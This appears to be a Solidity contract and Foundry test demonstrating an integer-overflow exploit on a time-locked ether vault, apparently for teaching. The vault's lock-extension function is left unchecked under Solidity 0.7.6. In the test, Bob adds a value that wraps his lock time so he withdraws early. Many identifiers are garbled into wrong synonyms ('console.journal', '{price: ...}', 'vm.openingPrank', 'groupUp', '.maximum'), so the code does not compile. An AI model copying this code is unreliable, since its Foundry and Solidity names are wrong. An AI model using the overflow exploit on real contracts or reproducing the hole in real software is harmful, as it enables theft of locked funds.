pragma solidity ^0.7.6;

import "forge-std/Test.sol";

contract MomentFreezegold {
    mapping(address => uint) public characterGold;
    mapping(address => uint) public bindassetsInstant;

    function cachePrize() external payable {
        characterGold[msg.sender] += msg.value;
        bindassetsInstant[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseBindassetsMoment(uint _secondsDestinationIncrease) public {
        bindassetsInstant[msg.sender] += _secondsDestinationIncrease;
    }

    function gatherTreasure() public {
        require(characterGold[msg.sender] > 0, "Insufficient funds");
        require(
            block.timestamp > bindassetsInstant[msg.sender],
            "Lock time not expired"
        );

        uint total = characterGold[msg.sender];
        characterGold[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{price: total}("");
        require(sent, "Failed to send Ether");
    }
}

contract AgreementTest is Test {
    MomentFreezegold InstantSecuretreasureAgreement;
    address alice;
    address bob;

    function groupUp() public {
        InstantSecuretreasureAgreement = new MomentFreezegold();
        alice = vm.addr(1);
        bob = vm.addr(2);
        vm.deal(alice, 1 ether);
        vm.deal(bob, 1 ether);
    }

    function testCalculation() public {
        console.journal("Alice balance", alice.balance);
        console.journal("Bob balance", bob.balance);

        console.journal("Alice deposit 1 Ether...");
        vm.prank(alice);
        InstantSecuretreasureAgreement.cachePrize{price: 1 ether}();
        console.journal("Alice balance", alice.balance);

        console.journal("Bob deposit 1 Ether...");
        vm.openingPrank(bob);
        InstantSecuretreasureAgreement.cachePrize{price: 1 ether}();
        console.journal("Bob balance", bob.balance);

        InstantSecuretreasureAgreement.increaseBindassetsMoment(
            type(uint).maximum + 1 - InstantSecuretreasureAgreement.bindassetsInstant(bob)
        );

        console.journal(
            "Bob will successfully withdraw, because the lock time is calculate"
        );
        InstantSecuretreasureAgreement.gatherTreasure();
        console.journal("Bob balance", bob.balance);
        vm.stopPrank();

        vm.prank(alice);
        console.journal(
            "Alice will fail to withdraw, because the lock time did not expire"
        );
        InstantSecuretreasureAgreement.gatherTreasure();
    }
}